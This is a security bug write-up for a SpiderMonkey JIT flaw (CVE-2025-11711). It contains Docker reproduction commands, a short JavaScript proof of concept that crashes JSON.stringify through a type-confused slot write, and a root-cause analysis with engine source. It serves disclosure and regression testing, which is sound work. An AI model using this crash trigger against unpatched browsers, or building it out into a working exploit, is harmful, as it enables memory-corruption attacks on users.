# Bug 1989978 — CVE-2025-11711: Segmentation fault in JSON.stringify

- **Bugzilla**: https://bugzilla.mozilla.org/show_bug.cgi?id=1989978
- **Component**: JavaScript Engine
- **Keywords**: csectype-jit, regression, reporter-external, sec-high
- **CVE**: CVE-2025-11711
- **Date filed**: 2025-09-22
- **Fix commit**: `fa91ed58b791e04279b8fbfd6476550dd1fcb27b` (2025-09-26, Jan de Mooij)
  > Bug 1989978: Don't support unwritable iterator indices r=jandem
- **Phabricator**: D266023
- **Test commit reported by submitter**: `767c44c1cde821258288378998f4bb481bec8908`

## Reproduce

```bash
docker build -t smlijun/spidermonkey.x86_64:1989978 .
docker run --rm \
  -v $(pwd)/poc.js:/testcase/poc.js \
  smlijun/spidermonkey.x86_64:1989978 \
  sh -c "/out/js --no-threads --ion-warmup-threshold=100 /testcase/poc.js"
```

Or:

```bash
cd .. && ./crash_check.sh 1989978
```

## PoC (verbatim from Bugzilla)

```js
function opt(a) {
    for (const it in a) {
        a[it] = 5;
    }
}
const obj = JSON.rawJSON(256n, 256n, opt);
for (let i = 0; i < 100; i++) {
    opt(obj);
}
JSON.stringify(obj);
```

## Root cause

`FastSerializeJSONProperty` in `js/src/builtin/JSON.cpp` peeks at the
`JSON.rawJSON`-wrapped object's reserved slot via `MaybeGetRawJSON` and
assumes the slot still holds a `JSString*`:

```cpp
static bool FastSerializeJSONProperty(JSContext* cx, Handle<Value> v,
                                      StringifyContext* scx,
                                      BailReason* whySlow) {
  MOZ_ASSERT(*whySlow == BailReason::NO_REASON);
  MOZ_ASSERT(v.isObject());

  if (JSString* rawJSON = MaybeGetRawJSON(cx, &v.toObject())) {
    return scx->sb.append(rawJSON);
  }
```

The CacheIR `for ... in` iteration optimisation does not invalidate
the cached property descriptor when the loop body writes back into
the iterated index, even though the property is supposed to be
non-writable. After 100 warm-up iterations Ion inlines the write as
a direct slot store, replacing the `JSString*` with a small integer
(`5`). On the next `JSON.stringify` call the integer is dereferenced
as a `JSString*`, producing a SEGV at `0x3800000000005` (or similar
tagged-value address — the reporter showed the address tracks the
written integer).

The fix removes the unsafe `for ... in` iteration optimisation for
properties whose descriptor is non-writable, forcing the write
through the slow descriptor-check path.

## Crash output

ASAN reports the SEGV as a deadly signal on a wild pointer; see
`output.txt` after building and running through `crash_check.sh`.
